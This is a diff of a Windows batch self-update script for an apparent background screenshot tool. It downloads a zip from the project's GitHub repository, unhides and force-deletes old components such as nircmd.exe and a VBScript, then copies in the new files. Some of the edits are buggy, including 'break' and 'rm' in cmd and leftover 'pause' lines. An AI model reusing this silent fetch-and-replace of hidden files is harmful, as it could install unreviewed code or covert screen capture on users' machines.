@@ -19,29 +19,27 @@ set /a countconnection+=1
 timeout 1 /nobreak > NUL
 ping /n 1 www.github.com > NUL
 
-powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/xwenx672/screenshot-script/archive/refs/heads/%zn%.zip' -UseBasicParsing -TimeoutSec 5 | Out-Null; exit 0 } catch { exit 1 }"
+rem powershell -Command "try { Invoke-WebRequest -Uri 'https://github.com/xwenx672/screenshot-script/archive/refs/heads/%zn%.zip' -UseBasicParsing -TimeoutSec 5 | Out-Null; exit 0 } catch { exit 1 }"
+
+powershell -c "Invoke-WebRequest -Uri 'https://github.com/xwenx672/screenshot-script/archive/refs/heads/%zn%.zip' -OutFile '%batdir%\%zn%.zip'"
 if %errorLevel% == 0 (
-	powershell -c "Invoke-WebRequest -Uri 'https://github.com/xwenx672/screenshot-script/archive/refs/heads/%zn%.zip' -OutFile '%batdir%\%zn%.zip'"
-	) else (
-	echo Waiting for connection...
-	if %countconnection% LSS 10 goto redoconcheck
-	echo Cannot update, quitting update script...
-	timeout 5 /nobreak > NUL
-	exit
+break
+) else (
+echo Waiting for connection...
+if %countconnection% LSS 10 goto redoconcheck
+echo Cannot update, quitting update script...
+timeout 5 /nobreak > NUL
+exit
 )
 
 
-attrib -h yoke.vbs
-attrib -h backgroundscreenshot.bat
-attrib -h delete.bat
-attrib -h nircmd.exe
-attrib -h update.bat
-attrib -h deleteday.bat
+attrib -h *
 timeout 1 /nobreak > NUL
 del /f yoke.vbs
 del /f backgroundscreenshot.bat
 del /f delete.bat
 del /f deleteday.bat
+del /f cpuload.bat
 del /f nircmd.exe
 cls
 echo LOADING...
@@ -59,24 +57,30 @@ timeout 1 /nobreak > NUL
 timeout 1 /nobreak > NUL
 timeout 1 /nobreak > NUL
 timeout 1 /nobreak > NUL
-move "%zn%/*" "%batdir%"
-
+xcopy "screenshot-script-%zn%\*" "%batdir%\" /s /e /y /i
+timeout 1 /nobreak > NUL
+timeout 1 /nobreak > NUL
+timeout 1 /nobreak > NUL
+timeout 1 /nobreak > NUL
+timeout 1 /nobreak > NUL
+pause
+rmdir /s /q "screenshot-script-%zn%"
+pause
 :errorwait2:
 rem echo Unpacking
-move 
 if not exist delete.bat goto errorwait2
 if not exist backgroundscreenshot.bat goto errorwait2
 if not exist nircmd.exe goto errorwait2
 if not exist update.bat goto errorwait2
 if not exist yoke.vbs goto errorwait2
-if not exist deleteday.bat goto errorwait2
+rem if not exist deleteday.bat goto errorwait2
 
 :errorwait3:
 rem echo deleting .zip
 del cssv.zip
-del main.zip
-if not exist main.zip goto continue
-goto errorwait3
+del %zn%.zip
+rm screenshot-script-%zn%
+if exist %zn%.zip goto errorwait3
 
 :continue:
 rem echo closing!
